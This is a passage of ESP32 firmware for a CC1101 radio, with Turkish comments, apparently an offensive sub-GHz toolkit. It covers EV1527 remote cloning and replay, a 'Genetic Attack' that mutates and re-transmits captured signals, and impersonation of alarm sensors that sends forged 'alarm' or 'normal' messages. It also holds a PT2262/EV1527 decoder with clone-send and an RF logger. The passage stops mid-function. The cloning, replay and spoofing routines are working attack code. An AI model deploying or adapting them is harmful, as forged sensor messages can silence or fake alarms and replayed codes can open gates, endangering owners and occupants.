    String cloneName = "ev1527_" + String(addrHex) + "_" + String(dataHex);
    if (g_sdInited) {
        String sdPath = "/rf_captures/" + cloneName + ".bin";
        File sdF = SD.open(sdPath.c_str(), FILE_WRITE);
        if (sdF) {
            sdF.write((uint8_t)'R'); sdF.write((uint8_t)'F');
            sdF.write((uint8_t)'C'); sdF.write((uint8_t)'1');
            sdF.write((uint8_t)(cp >> 8));
            sdF.write((uint8_t)(cp & 0xFF));
            uint8_t fb[4]; memcpy(fb, &g_cc1101Freq, 4);
            sdF.write(fb, 4);
            for (uint16_t i = 0; i < cp; i++) {
                sdF.write((uint8_t)(clonePulses[i].dur >> 8));
                sdF.write((uint8_t)(clonePulses[i].dur & 0xFF));
                sdF.write((uint8_t)(clonePulses[i].level ? 1 : 0));
            }
            sdF.close();
            saved = true;
            logPush("[EV1527] clone saved: " + sdPath);
        }
    }
    if (!saved) {
        // SPIFFS fallback
        saved = rf_capture_save(cloneName);
    }

    // Test gönder (3x)
    cc1101_setModulation(CC_MOD_ASKOOK);
    cc1101_setFrequency(g_cc1101Freq);
    cc1101_strobe(CC1101_SIDLE);
    cc1101_strobe(CC1101_STX);
    for (uint8_t r = 0; r < 3; r++) {
        cc1101_sendPulses(clonePulses, cp);
        delay(20);
    }
    cc1101_strobe(CC1101_SIDLE);
    buzzRFReplay();

    logPush("[EV1527] addr=0x" + String(addrHex)
            + " data=0x" + String(dataHex)
            + " T=" + String(T) + "us bits=" + String(bitCount));
    g_xpCloneCnt++;
    xpAdd(XP_PER_RFID_CLONE);
    dispBannerOK(saved ? "Clone SD'ye kaydedildi + gonderildi"
                       : "Clone gonderildi (SD yok)");
}

// ─── 18. Replay + Mutasyon (Genetic Attack) ───────────────
// Her turda sinyalin küçük bir bölümünü rastgele değiştirir
// (mutasyon). Gönderim sırasında RSSI dinleyerek ACK/yankı
// tespit etmeye çalışır. Adaptif arama: başarılı görünen
// mutasyonları (RSSI artışı) bir sonraki nesle taşır.
static void cc1101_genetic_replay_run() {
    if (!cc1101_ensureInit()) return;

    if (!spiffs_ensure()) { dispBannerErr("SPIFFS hatasi!"); return; }
    std::vector<String> files = rf_capture_list();
    if (files.empty()) { dispBannerWarn("Kayitli sinyal yok!"); return; }

    OptionList fo;
    for (auto& f : files) {
        String sn = f;
        if (sn.startsWith("spiffs:")) sn = "[S]" + sn.substring(sn.lastIndexOf('/')+1);
        else if (sn.startsWith("sd:"))  sn = "[D]" + sn.substring(sn.lastIndexOf('/')+1);
        if (sn.endsWith(".bin")) sn = sn.substring(0, sn.length()-4);
        if (sn.length() > 17)   sn = sn.substring(0, 16) + "~";
        fo.push_back({sn, [](){}});
    }
    fo.push_back({"Back", [](){}});
    int fsel = loopOptions(fo, "Genetic: Dosya");
    if (fsel < 0 || fsel == (int)fo.size()-1) return;

    dispProgress("Genetic Attack", "Yukleniyor...", 30);
    if (!rf_capture_load(files[fsel])) { dispBannerErr("Yuklenemedi!"); return; }
    if (g_rfCaptureLen < 8) { dispBannerWarn("Cok kisa!"); return; }

    // Mutasyon parametrelerini seç
    OptionList mutOpts = {
        {"Hafif  (1-2 pulse)",     [](){}},
        {"Orta   (3-5 pulse)",     [](){}},
        {"Agresif (8-12 pulse)",   [](){}},
        {"Back",                   [](){}},
    };
    int ms = loopOptions(mutOpts, "Mutasyon Gucu");
    if (ms < 0 || ms == 3) return;
    uint8_t mutCount = (ms == 0) ? 2 : (ms == 1) ? 5 : 12;

    cc1101_setModulation(CC_MOD_ASKOOK);
    cc1101_setFrequency(g_cc1101Freq);

    // Orijinal "gen"i sakla
    static RFPulse origGene[CC_CAPTURE_MAX];
    static RFPulse bestGene[CC_CAPTURE_MAX];
    uint16_t geneLen = g_rfCaptureLen;
    memcpy(origGene, g_rfCapture, geneLen * sizeof(RFPulse));
    memcpy(bestGene, g_rfCapture, geneLen * sizeof(RFPulse));

    int8_t  bestRSSI   = -120;
    uint32_t generation = 0;
    uint32_t totalSent  = 0;
    uint32_t lastDraw   = 0;

    dispClear(); dispStatusBar("Genetic Attack");
    dispText(0, 14, "Basliyor...");
    dispText(0, 26, "Frek: " + String(g_cc1101Freq, 2) + " MHz");
    dispText(0, 38, "Pulse: " + String(geneLen));
    dispText(0, 52, "[LONG] durdur");
    dispCommit();
    delay(600);

    while (!readButtonLong()) {
        // Mevcut en iyi geni mutasyona uğrat
        memcpy(g_rfCapture, bestGene, geneLen * sizeof(RFPulse));
        g_rfCaptureLen = geneLen;

        // Mutasyon uygula: rastgele pulseleri değiştir
        for (uint8_t m = 0; m < mutCount; m++) {
            uint16_t idx = (uint16_t)(esp_random() % geneLen);
            uint8_t  mutType = esp_random() % 4;
            switch (mutType) {
                case 0: // bit flip
                    g_rfCapture[idx].level = !g_rfCapture[idx].level;
                    break;
                case 1: // süre ±%20
                    {
                        int32_t delta = (int32_t)(g_rfCapture[idx].dur * 20 / 100);
                        int32_t nd = (int32_t)g_rfCapture[idx].dur +
                                     ((esp_random() & 1) ? delta : -delta);
                        g_rfCapture[idx].dur = (uint16_t)constrain(nd, 100, 60000);
                    }
                    break;
                case 2: // iki pulse yer değiştir
                    {
                        uint16_t idx2 = (uint16_t)(esp_random() % geneLen);
                        RFPulse tmp = g_rfCapture[idx];
                        g_rfCapture[idx] = g_rfCapture[idx2];
                        g_rfCapture[idx2] = tmp;
                    }
                    break;
                case 3: // süre ×2 veya ÷2
                    if (esp_random() & 1)
                        g_rfCapture[idx].dur = min((uint32_t)60000, (uint32_t)g_rfCapture[idx].dur * 2);
                    else
                        g_rfCapture[idx].dur = max((uint16_t)100, (uint16_t)(g_rfCapture[idx].dur / 2));
                    break;
            }
        }

        // Gönder
        cc1101_strobe(CC1101_SIDLE);
        cc1101_strobe(CC1101_STX);
        cc1101_sendPulses(g_rfCapture, g_rfCaptureLen);
        totalSent++;
        delay(15);

        // Hızlıca RX'e geç, yankı/ACK RSSI ölç
        cc1101_strobe(CC1101_SIDLE);
        cc1101_strobe(CC1101_SRX);
        delayMicroseconds(600);
        int8_t curRSSI = cc1101_getRSSI();
        cc1101_strobe(CC1101_SIDLE);

        // Eğer bu nesil daha iyi RSSI aldıysa en iyi gen olarak sakla
        if (curRSSI > bestRSSI) {
            bestRSSI = curRSSI;
            memcpy(bestGene, g_rfCapture, geneLen * sizeof(RFPulse));
        }

        // Her 10 nesilden birinde orijinal gene sıfırla (local minima escape)
        if (generation % 50 == 49) {
            memcpy(bestGene, origGene, geneLen * sizeof(RFPulse));
            bestRSSI = -120;
        }

        generation++;

        if (millis() - lastDraw > 300) {
            lastDraw = millis();
            dispClear(); dispStatusBar("Genetic Attack");
            dispText(0, 10, "Nesil: " + String(generation));
            dispText(0, 20, "Gonderim: " + String(totalSent));
            dispText(0, 30, "En iyi RSSI: " + String(bestRSSI) + " dBm");
            dispText(0, 40, "Mut: " + String(mutCount) + " pulse/gen");
            // RSSI bar
            uint8_t barW = (uint8_t)map(constrain((int)bestRSSI, -120, -40), -120, -40, 0, OLED_W-4);
            display.drawRect(2, 50, OLED_W-4, 6, SSD1306_WHITE);
            if (barW > 0) display.fillRect(2, 50, barW, 6, SSD1306_WHITE);
            dispCommit();
        }
        delay(5);
    }

    cc1101_strobe(CC1101_SIDLE);

    // En iyi geni SD'ye kaydet
    memcpy(g_rfCapture, bestGene, geneLen * sizeof(RFPulse));
    g_rfCaptureLen = geneLen;
    String gname = "genetic_best_" + String(millis() / 1000);
    bool gsaved = false;
    if (g_sdInited) {
        String sdPath = "/rf_captures/" + gname + ".bin";
        File sdF = SD.open(sdPath.c_str(), FILE_WRITE);
        if (sdF) {
            sdF.write((uint8_t)'R'); sdF.write((uint8_t)'F');
            sdF.write((uint8_t)'C'); sdF.write((uint8_t)'1');
            sdF.write((uint8_t)(geneLen >> 8));
            sdF.write((uint8_t)(geneLen & 0xFF));
            uint8_t fb[4]; memcpy(fb, &g_cc1101Freq, 4);
            sdF.write(fb, 4);
            for (uint16_t i = 0; i < geneLen; i++) {
                sdF.write((uint8_t)(bestGene[i].dur >> 8));
                sdF.write((uint8_t)(bestGene[i].dur & 0xFF));
                sdF.write((uint8_t)(bestGene[i].level ? 1 : 0));
            }
            sdF.close(); gsaved = true;
        }
    }
    if (!gsaved) rf_capture_save(gname);

    logPush("[GENETIC] gen=" + String(generation)
            + " sent=" + String(totalSent)
            + " bestRSSI=" + String(bestRSSI) + "dBm");
    dispBannerOK("Bitti: " + String(generation) + " nesil, RSSI=" + String(bestRSSI));
}

// ─── 19. Sensor Impersonation (Sahte Sensör) ─────────────
// Alarm PIR, kapı/pencere manyetiği, duman dedektörü gibi
// 433 MHz OOK sensörlerin mesajlarını yakala, cihaz ID'sini
// çıkar ve sahte "normal" veya "alarm" mesajı üret.
static void cc1101_sensor_impersonate_run() {
    if (!cc1101_ensureInit()) return;

    OptionList modeOpts = {
        {"Yakala & Analiz",  [](){}},
        {"Sahte Alarm Gon.", [](){}},
        {"Sahte Normal Gon.",[](){}},
        {"Dosyadan Clone",   [](){}},
        {"Back",             [](){}},
    };
    int ms = loopOptions(modeOpts, "Sensor Imperson.");
    if (ms < 0 || ms == 4) return;

    OptionList freqOpts = {
        {"433.92 MHz", [](){}},
        {"315.00 MHz", [](){}},
        {"868.30 MHz", [](){}},
        {"Back",       [](){}},
    };
    int fs = loopOptions(freqOpts, "Sensor Frekansi");
    if (fs < 0 || fs == 3) return;
    float fqs[] = {433.92f, 315.0f, 868.30f};
    cc1101_setFrequency(fqs[fs]);
    cc1101_setModulation(CC_MOD_ASKOOK);

    if (ms == 0) {
        // ── Yakala & Analiz ──────────────────────────────
        cc1101_writeReg(CC1101_IOCFG0, 0x0D);
        cc1101_strobe(CC1101_SIDLE);
        cc1101_strobe(CC1101_SRX);

        dispClear(); dispStatusBar("Sensor Yakala");
        dispText(0, 12, "Sensoru tetikle...");
        dispText(0, 22, String(fqs[fs], 2) + " MHz");
        dispText(0, 34, "(PIR, kapi, duman)");
        dispText(0, 50, "LONG: iptal");
        dispCommit();

        uint32_t wt = millis();
        while (digitalRead(PIN_CC1101_GDO0) == LOW) {
            if (readButtonLong()) { cc1101_strobe(CC1101_SIDLE); return; }
            if (millis() - wt > 15000) {
                dispBannerWarn("Sinyal yok (15s)");
                cc1101_strobe(CC1101_SIDLE); return;
            }
            delay(1);
        }

        // Pulse yakala (daha uzun pencere — sensörler yavaş)
        g_rfCaptureLen = 0;
        bool     lv = (digitalRead(PIN_CC1101_GDO0) == HIGH);
        uint32_t lu = micros();
        uint32_t ct = millis();
        while (millis() - ct < 500 && g_rfCaptureLen < CC_CAPTURE_MAX - 1) {
            bool cv = (digitalRead(PIN_CC1101_GDO0) == HIGH);
            if (cv != lv) {
                uint32_t now = micros();
                uint32_t dur = now - lu;
                if (dur > 50) g_rfCapture[g_rfCaptureLen++] = {(uint16_t)min(dur,(uint32_t)65000), lv};
                lv = cv; lu = now;
            }
            if (g_rfCaptureLen > 6 && micros() - lu > 30000) break;
        }
        cc1101_strobe(CC1101_SIDLE);

        if (g_rfCaptureLen < 8) { dispBannerWarn("Cok az veri!"); return; }

        // T hesapla + cihaz ID tahmini (ilk 24 bit = cihaz ID yaygın format)
        uint32_t minD = 0xFFFF;
        for (uint16_t i = 0; i < g_rfCaptureLen; i++)
            if (g_rfCapture[i].dur > 80 && g_rfCapture[i].dur < (uint32_t)minD)
                minD = g_rfCapture[i].dur;
        uint32_t T   = minD;
        uint32_t thr = T + T / 2;

        // Preamble/sync sonrasını bul
        uint16_t dstart = 0;
        for (uint16_t i = 0; i < g_rfCaptureLen - 1; i++) {
            if (!g_rfCapture[i].level && g_rfCapture[i].dur > T * 10) {
                dstart = i + 1; break;
            }
        }

        // Bit decode
        uint32_t devID = 0;
        uint8_t  bitCnt = 0;
        for (uint16_t i = dstart; i + 1 < g_rfCaptureLen && bitCnt < 24; i += 2) {
            uint16_t hd = g_rfCapture[i].level ? g_rfCapture[i].dur : g_rfCapture[i+1].dur;
            devID = (devID << 1) | (hd > thr ? 1 : 0);
            bitCnt++;
        }

        // SD'ye kaydet
        String sname = "sensor_" + String(millis() / 1000);
        bool ssaved = false;
        if (g_sdInited) {
            String sdPath = "/rf_captures/" + sname + ".bin";
            File sf = SD.open(sdPath.c_str(), FILE_WRITE);
            if (sf) {
                sf.write((uint8_t)'R'); sf.write((uint8_t)'F');
                sf.write((uint8_t)'C'); sf.write((uint8_t)'1');
                sf.write((uint8_t)(g_rfCaptureLen >> 8));
                sf.write((uint8_t)(g_rfCaptureLen & 0xFF));
                uint8_t fb[4]; memcpy(fb, &g_cc1101Freq, 4);
                sf.write(fb, 4);
                for (uint16_t i = 0; i < g_rfCaptureLen; i++) {
                    sf.write((uint8_t)(g_rfCapture[i].dur >> 8));
                    sf.write((uint8_t)(g_rfCapture[i].dur & 0xFF));
                    sf.write((uint8_t)(g_rfCapture[i].level ? 1 : 0));
                }
                sf.close(); ssaved = true;
            }
        }
        if (!ssaved) rf_capture_save(sname);

        char idHex[8];
        snprintf(idHex, sizeof(idHex), "%06X", devID & 0xFFFFFF);
        dispClear(); dispStatusBar("Sensor Analiz");
        dispText(0, 10, "Cihaz ID: 0x" + String(idHex));
        dispText(0, 20, "Pulse: " + String(g_rfCaptureLen));
        dispText(0, 30, "T: " + String(T) + " us");
        dispText(0, 40, "Bits: " + String(bitCnt));
        dispText(0, 50, ssaved ? "SD kaydedildi!" : "SPIFFS kaydedildi");
        dispCommit();
        logPush("[SENSOR] id=0x" + String(idHex)
                + " T=" + String(T) + " pulses=" + String(g_rfCaptureLen));
        delay(3000);
        return;
    }

    if (ms == 3) {
        // Dosyadan yükle
        std::vector<String> files = rf_capture_list();
        if (files.empty()) { dispBannerWarn("Dosya yok!"); return; }
        OptionList fo;
        for (auto& f : files) {
            String sn = f;
            if (sn.startsWith("spiffs:")) sn = "[S]" + sn.substring(sn.lastIndexOf('/')+1);
            else if (sn.startsWith("sd:"))  sn = "[D]" + sn.substring(sn.lastIndexOf('/')+1);
            if (sn.endsWith(".bin")) sn = sn.substring(0, sn.length()-4);
            if (sn.length() > 17)   sn = sn.substring(0, 16) + "~";
            fo.push_back({sn, [](){}});
        }
        fo.push_back({"Back", [](){}});
        int fsel = loopOptions(fo, "Sensor: Dosya");
        if (fsel < 0 || fsel == (int)fo.size()-1) return;
        if (!rf_capture_load(files[fsel])) { dispBannerErr("Yuklenemedi!"); return; }
    }

    // ms == 1: Sahte Alarm, ms == 2: Sahte Normal, ms == 3: Clone replay
    // Mevcut g_rfCapture içeriğini kullan
    // Alarm için: son 4 biti 1111 (alarm=tetik), Normal için 0000

    if (ms == 1 || ms == 2) {
        // Son 4 biti manipüle et
        uint8_t  setVal   = (ms == 1) ? 0xF : 0x0;
        uint16_t halfLen  = g_rfCaptureLen / 2;
        // Son 8 pulse (4 bit ≈ 8 pulse) üzerinde yazar
        uint16_t editStart = (g_rfCaptureLen > 16) ? g_rfCaptureLen - 8 : 0;
        for (uint16_t i = editStart; i < g_rfCaptureLen && i < editStart + 8; i++) {
            uint8_t bitPos = (i - editStart) / 2;
            g_rfCapture[i].level = (setVal >> (3 - (bitPos % 4))) & 1;
        }
        (void)halfLen;
    }

    // Gönder (5x)
    dispClear(); dispStatusBar("Sensor Imperson.");
    dispText(0, 14, ms == 1 ? "Sahte ALARM!" : ms == 2 ? "Sahte NORMAL" : "Clone Replay");
    dispText(0, 26, String(fqs[fs], 2) + " MHz");
    dispText(0, 38, "5x gonderiliyor...");
    dispCommit();

    cc1101_strobe(CC1101_SIDLE);
    cc1101_strobe(CC1101_STX);
    for (uint8_t r = 0; r < 5; r++) {
        cc1101_sendPulses(g_rfCapture, g_rfCaptureLen);
        delay(30);
        dispText(0, 50, String(r+1) + "/5");
        dispCommit();
    }
    cc1101_strobe(CC1101_SIDLE);
    buzzRFReplay();
    logPush("[SENSOR_IMP] mode=" + String(ms)
            + " freq=" + String(fqs[fs], 2) + "MHz");
    dispBannerOK("Sensor mesaji gonderildi!");
}

// ─── 20. PT2262 / EV1527 Tam Decoder ─────────────────────
// PT2262: tri-state kodlama (0/1/float), 12 bit adres + 4 bit data
// EV1527: PWM kodlama, 20 bit adres + 4 bit data
// Her ikisini de otomatik dener, hangisi daha tutarlıysa seçer.
static void cc1101_pt2262_decoder_run() {
    if (!cc1101_ensureInit()) return;

    OptionList freqOpts = {
        {"433.92 MHz", [](){}},
        {"315.00 MHz", [](){}},
        {"434.42 MHz", [](){}},
        {"Back",       [](){}},
    };
    int fs = loopOptions(freqOpts, "PT2262/EV1527: Frek");
    if (fs < 0 || fs == 3) return;
    float fqs[] = {433.92f, 315.0f, 434.42f};
    cc1101_setFrequency(fqs[fs]);
    cc1101_setModulation(CC_MOD_ASKOOK);
    cc1101_setBaudRate(2400);
    cc1101_writeReg(CC1101_IOCFG0, 0x0D);
    cc1101_strobe(CC1101_SIDLE);
    cc1101_strobe(CC1101_SRX);

    uint8_t captureCount = 0;

    while (!readButtonLong()) {
        dispClear(); dispStatusBar("PT2262/EV1527");
        dispText(0, 12, "Frek: " + String(fqs[fs], 2) + " MHz");
        dispText(0, 22, "#" + String(captureCount) + " - Kumandayi bas...");
        dispText(0, 34, "OOK/PWM/Tristate");
        dispText(0, 50, "LONG: cik");
        dispCommit();

        // Carrier bekle
        uint32_t wt = millis();
        while (digitalRead(PIN_CC1101_GDO0) == LOW) {
            if (readButtonLong()) { cc1101_strobe(CC1101_SIDLE); return; }
            if (millis() - wt > 10000) {
                dispBannerWarn("Sinyal yok (10s)");
                cc1101_strobe(CC1101_SIDLE); return;
            }
            delay(1);
        }

        // Pulse yakala
        g_rfCaptureLen = 0;
        bool     lv = (digitalRead(PIN_CC1101_GDO0) == HIGH);
        uint32_t lu = micros();
        uint32_t ct = millis();
        while (millis() - ct < 400 && g_rfCaptureLen < CC_CAPTURE_MAX - 1) {
            bool cv = (digitalRead(PIN_CC1101_GDO0) == HIGH);
            if (cv != lv) {
                uint32_t now = micros();
                uint32_t dur = now - lu;
                if (dur > 50) g_rfCapture[g_rfCaptureLen++] = {(uint16_t)min(dur,(uint32_t)65000), lv};
                lv = cv; lu = now;
            }
            if (g_rfCaptureLen > 10 && micros() - lu > 25000) break;
        }
        cc1101_strobe(CC1101_SIDLE);

        if (g_rfCaptureLen < 12) {
            dispBannerWarn("Yetersiz pulse, tekrar...");
            delay(500); cc1101_strobe(CC1101_SRX); continue;
        }

        // T hesapla (en kısa pulse)
        uint32_t minD = 0xFFFF;
        for (uint16_t i = 0; i < g_rfCaptureLen; i++)
            if (g_rfCapture[i].dur > 80 && g_rfCapture[i].dur < (uint32_t)minD)
                minD = g_rfCapture[i].dur;
        uint32_t T = minD;
        if (T < 80) T = 350;

        uint32_t thr1 = T + T / 2;   // 1.5T
        uint32_t thr2 = T * 2 + T;   // 3T

        // Preamble/sync bul
        uint16_t ds = 0;
        for (uint16_t i = 0; i < g_rfCaptureLen - 1; i++) {
            if (!g_rfCapture[i].level && g_rfCapture[i].dur > T * 15) {
                ds = i + 1; break;
            }
        }

        // ─── EV1527 decode (PWM) ──────────────────────
        // 0: 1T HIGH + 3T LOW
        // 1: 3T HIGH + 1T LOW
        uint32_t ev_code = 0;
        uint8_t  ev_bits = 0;
        for (uint16_t i = ds; i + 1 < g_rfCaptureLen && ev_bits < 24; i += 2) {
            uint16_t hd = g_rfCapture[i].level ? g_rfCapture[i].dur : g_rfCapture[i+1].dur;
            ev_code = (ev_code << 1) | (hd > (uint32_t)thr1 ? 1 : 0);
            ev_bits++;
        }
        uint32_t ev_addr = (ev_code >> 4) & 0x000FFFFF;
        uint8_t  ev_data = ev_code & 0x0F;

        // ─── PT2262 decode (Tri-state) ─────────────────
        // Bit "0":     1T HIGH + 3T LOW  → '0'
        // Bit "1":     3T HIGH + 1T LOW  → '1'
        // Bit "float": 1T HIGH + 1T LOW + 1T HIGH + 1T LOW → 'F'
        // Sadece 12 adres + 4 data = 16 bit, her bit 2 pulse veya 4 pulse
        char     pt_bits_str[20] = {};
        uint8_t  pt_bit_cnt = 0;
        uint32_t pt_addr    = 0;
        uint8_t  pt_data    = 0;
        {
            uint16_t i = ds;
            while (i + 1 < g_rfCaptureLen && pt_bit_cnt < 16) {
                uint16_t h1 = g_rfCapture[i].level ? g_rfCapture[i].dur : g_rfCapture[i+1].dur;
                uint16_t l1 = g_rfCapture[i].level ? g_rfCapture[i+1].dur : g_rfCapture[i].dur;
                if (h1 < (uint32_t)thr1 && l1 > (uint32_t)thr2) {
                    // "0" bit: kısa H + uzun L
                    pt_bits_str[pt_bit_cnt] = '0';
                    if (pt_bit_cnt < 12) pt_addr = (pt_addr << 1) | 0;
                    else pt_data = (pt_data << 1) | 0;
                    pt_bit_cnt++; i += 2;
                } else if (h1 > (uint32_t)thr2 && l1 < (uint32_t)thr1) {
                    // "1" bit: uzun H + kısa L
                    pt_bits_str[pt_bit_cnt] = '1';
                    if (pt_bit_cnt < 12) pt_addr = (pt_addr << 1) | 1;
                    else pt_data = (pt_data << 1) | 1;
                    pt_bit_cnt++; i += 2;
                } else if (i + 3 < g_rfCaptureLen) {
                    // "float" bit: iki kısa çift
                    pt_bits_str[pt_bit_cnt] = 'F';
                    pt_bit_cnt++; i += 4;
                } else {
                    i += 2;
                }
            }
            pt_bits_str[pt_bit_cnt] = 0;
        }

        captureCount++;

        // ─── Sonuç göster ─────────────────────────────
        dispClear(); dispStatusBar("Decode #" + String(captureCount));

        // EV1527 satırı
        char evAddrH[8];
        snprintf(evAddrH, sizeof(evAddrH), "%05X", ev_addr);
        dispText(0, 8,  "EV1527 Addr: 0x" + String(evAddrH));
        dispText(0, 18, "EV1527 Data: " + String(ev_data, BIN) + " (" + String(ev_data) + ")");

        // PT2262 satırı
        char ptAddrH[6];
        snprintf(ptAddrH, sizeof(ptAddrH), "%04X", pt_addr & 0xFFF);
        dispText(0, 30, "PT2262 Addr: 0x" + String(ptAddrH));
        dispText(0, 40, "PT2262 Bits: " + String(pt_bits_str).substring(0, 12));
        dispText(0, 50, "T=" + String(T) + "us P=" + String(g_rfCaptureLen));
        dispCommit();

        // SD kaydet
        String dname = "pt2262_" + String(evAddrH) + "_" + String(ev_data);
        bool dsaved = false;
        if (g_sdInited) {
            String sdPath = "/rf_captures/" + dname + ".bin";
            File df = SD.open(sdPath.c_str(), FILE_WRITE);
            if (df) {
                df.write((uint8_t)'R'); df.write((uint8_t)'F');
                df.write((uint8_t)'C'); df.write((uint8_t)'1');
                df.write((uint8_t)(g_rfCaptureLen >> 8));
                df.write((uint8_t)(g_rfCaptureLen & 0xFF));
                uint8_t fb[4]; memcpy(fb, &g_cc1101Freq, 4);
                df.write(fb, 4);
                for (uint16_t i = 0; i < g_rfCaptureLen; i++) {
                    df.write((uint8_t)(g_rfCapture[i].dur >> 8));
                    df.write((uint8_t)(g_rfCapture[i].dur & 0xFF));
                    df.write((uint8_t)(g_rfCapture[i].level ? 1 : 0));
                }
                df.close(); dsaved = true;
            }
        }
        if (!dsaved) rf_capture_save(dname);

        logPush("[PT2262] ev_addr=0x" + String(evAddrH)
                + " ev_data=" + String(ev_data)
                + " pt_addr=0x" + String(ptAddrH)
                + " pt_bits=" + String(pt_bits_str)
                + " T=" + String(T));

        // Devam / çık menüsü
        OptionList actOpts = {
            {"Tekrar Dinle",  [](){}},
            {"Clone Gonder",  [](){}},
            {"Back",          [](){}},
        };
        int asel = loopOptions(actOpts, "PT2262 Islem");
        if (asel == 1) {
            // Clone olarak gönder (3x)
            cc1101_strobe(CC1101_SIDLE);
            cc1101_strobe(CC1101_STX);
            for (uint8_t r = 0; r < 3; r++) {
                cc1101_sendPulses(g_rfCapture, g_rfCaptureLen);
                delay(25);
            }
            cc1101_strobe(CC1101_SIDLE);
            buzzRFReplay();
            dispBannerOK("Clone 3x gonderildi");
        } else if (asel != 0) {
            break;
        }

        cc1101_strobe(CC1101_SIDLE);
        cc1101_strobe(CC1101_SRX);
    }

    cc1101_strobe(CC1101_SIDLE);
    logPush("[PT2262] total=" + String(captureCount) + " captures");
    dispBannerOK("PT2262/EV1527 bitti: " + String(captureCount) + " frame");
}

// ─── 21. Ham RF SD Logger (URH/inspectrum formatı) ────────
// Yakalanan pulse'ları SD kartta CSV formatında kaydeder.
// Universal Radio Hacker (URH) ve inspectrum ile analiz
// edilmek üzere tasarlanmış. Her satır: µs, level (0/1).
static void cc1101_rf_sd_logger_run() {
    if (!cc1101_ensureInit()) return;

    if (!g_sdInited) {
        dispBannerErr("SD kart yok! Takili mi?");
        return;
    }

    // Oturum klasörü oluştur
    String sessionDir = "/rf_log_" + String(millis() / 1000);
    SD.mkdir(sessionDir.c_str());

    OptionList freqOpts = {
        {"433.92 MHz",  [](){}},
        {"315.00 MHz",  [](){}},
        {"868.30 MHz",  [](){}},
        {"Frekans Sec", [](){}},
        {"Back",        [](){}},
    };
    int fs = loopOptions(freqOpts, "SD Logger: Frek");
    if (fs < 0 || fs == 4) return;
    if (fs == 3) { cc1101_freq_run(); }
    else {
        float fqs[] = {433.92f, 315.0f, 868.30f};
        cc1101_setFrequency(fqs[fs]);
    }

    // Format seç
    OptionList fmtOpts = {
        {"CSV (us;level)",   [](){}},  // URH uyumlu
        {"Pulse Binary",     [](){}},  // .bin kayıt (mevcut format)
        {"Her Ikisi",        [](){}},
        {"Back",             [](){}},
    };
    int fmt = loopOptions(fmtOpts, "SD Kayit Format");
    if (fmt < 0 || fmt == 3) return;

    cc1101_setModulation(CC_MOD_ASKOOK);
    cc1101_writeReg(CC1101_IOCFG0, 0x0D);
    cc1101_strobe(CC1101_SIDLE);
    cc1101_strobe(CC1101_SRX);

    uint16_t fileIndex = 0;
    uint32_t totalPulses = 0;

    dispClear(); dispStatusBar("SD RF Logger");
    dispText(0, 12, "Klasor: " + sessionDir.substring(1));
    dispText(0, 22, "Format: " + String(fmt == 0 ? "CSV" : fmt == 1 ? "BIN" : "CSV+BIN"));
    dispText(0, 32, String(g_cc1101Freq, 2) + " MHz  OOK");
    dispText(0, 42, "Sinyal bekliyor...");
    dispText(0, 54, "[LONG] durdur");
    dispCommit();

    while (!readButtonLong()) {
        // Carrier bekle
        uint32_t wt = millis();
        bool     gotSignal = false;
        while (millis() - wt < 3000) {
            if (digitalRead(PIN_CC1101_GDO0) == HIGH) { gotSignal = true; break; }
            if (readButtonLong()) goto sdLoggerDone;
            delay(1);
        }
        if (!gotSignal) {
            // Zaman aşımı → beklemeye devam
            dispText(0, 42, "Bekliyor... " + String(fileIndex) + " dosya");
            dispCommit();
            continue;
        }

        // Pulse yakala
        g_rfCaptureLen = 0;
        bool     lv = (digitalRead(PIN_CC1101_GDO0) == HIGH);
        uint32_t lu = micros();
        uint32_t ct = millis();
        while (millis() - ct < 500 && g_rfCaptureLen < CC_CAPTURE_MAX - 1) {
            bool cv = (digitalRead(PIN_CC1101_GDO0) == HIGH);
            if (cv != lv) {
                uint32_t now = micros();
                uint32_t dur = now - lu;
                if (dur > 50) g_rfCapture[g_rfCaptureLen++] = {(uint16_t)min(dur,(uint32_t)65000), lv};
                lv = cv; lu = now;
            }
            if (g_rfCaptureLen > 6 && micros() - lu > 40000) break;
        }

        if (g_rfCaptureLen < 6) {
            cc1101_strobe(CC1101_SIDLE);
            cc1101_strobe(CC1101_SRX);
            continue;
        }

        fileIndex++;
        totalPulses += g_rfCaptureLen;
        String baseName = sessionDir + "/sig_" + String(fileIndex);

        // CSV kayıt (URH uyumlu format)
        if (fmt == 0 || fmt == 2) {
            String csvPath = baseName + ".csv";
            File csvF = SD.open(csvPath.c_str(), FILE_WRITE);
            if (csvF) {
                // URH başlık
                csvF.println("# RF Pulse Log - URH compatible");
                csvF.println("# Freq=" + String(g_cc1101Freq, 5) + "MHz Mod=OOK");
                csvF.println("# us;level");
                for (uint16_t i = 0; i < g_rfCaptureLen; i++) {
                    csvF.print(g_rfCapture[i].dur);
                    csvF.print(';');
                    csvF.println(g_rfCapture[i].level ? '1' : '0');
                }
                csvF.close();
            }
        }

        // Binary kayıt (mevcut RFC1 format)
        if (fmt == 1 || fmt == 2) {
            String binPath = baseName + ".bin";
            File binF = SD.open(binPath.c_str(), FILE_WRITE);
            if (binF) {
                binF.write((uint8_t)'R'); binF.write((uint8_t)'F');
                binF.write((uint8_t)'C'); binF.write((uint8_t)'1');
                binF.write((uint8_t)(g_rfCaptureLen >> 8));
                binF.write((uint8_t)(g_rfCaptureLen & 0xFF));
                uint8_t fb[4]; memcpy(fb, &g_cc1101Freq, 4);
                binF.write(fb, 4);
                for (uint16_t i = 0; i < g_rfCaptureLen; i++) {
                    binF.write((uint8_t)(g_rfCapture[i].dur >> 8));
                    binF.write((uint8_t)(g_rfCapture[i].dur & 0xFF));
                    binF.write((uint8_t)(g_rfCapture[i].level ? 1 : 0));
                }
                binF.close();
            }
        }

        logPush("[SDLOG] sig_" + String(fileIndex)
                + " pulses=" + String(g_rfCaptureLen));

        // Ekran güncelle
        dispClear(); dispStatusBar("SD RF Logger");
        dispText(0, 10, "Dosya #" + String(fileIndex) + " kaydedildi");
        dispText(0, 20, "Pulse: " + String(g_rfCaptureLen));
        dispText(0, 30, "Toplam: " + String(totalPulses) + " pulse");
        dispText(0, 40, sessionDir.substring(0, 20));
        dispText(0, 52, "[LONG] durdur");
        dispCommit();

        // Bir sonraki sinyal için RX'e dön
        cc1101_strobe(CC1101_SIDLE);
        cc1101_strobe(CC1101_SRX);
        delay(100); // debounce
    }

sdLoggerDone:
    cc1101_strobe(CC1101_SIDLE);

    // Oturum özet dosyası yaz
    String summaryPath = sessionDir + "/session.txt";
    File sf = SD.open(summaryPath.c_str(), FILE_WRITE);
    if (sf) {
        sf.println("RF Session Summary");
        sf.println("Freq: " + String(g_cc1101Freq, 5) + " MHz");
        sf.println("Files: " + String(fileIndex));
